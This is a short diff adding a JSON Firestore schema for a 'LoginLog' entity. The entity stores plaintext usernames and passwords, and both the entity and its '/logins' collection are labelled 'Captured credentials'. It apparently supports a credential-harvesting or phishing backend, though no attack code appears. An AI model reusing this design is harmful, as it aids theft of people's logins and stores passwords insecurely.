@@ -1,0 +1,22 @@
+{
+  "entities": {
+    "LoginLog": {
+      "title": "Login Log",
+      "description": "Captured login credentials",
+      "type": "object",
+      "properties": {
+        "username": { "type": "string", "maxLength": 500 },
+        "password": { "type": "string", "maxLength": 500 },
+        "timestamp": { "type": "string", "format": "date-time" },
+        "createdAt": { "type": "string", "format": "date-time" }
+      },
+      "required": ["username", "password", "timestamp", "createdAt"]
+    }
+  },
+  "firestore": {
+    "/logins/{loginId}": {
+      "schema": "LoginLog",
+      "description": "Captured credentials"
+    }
+  }
+}
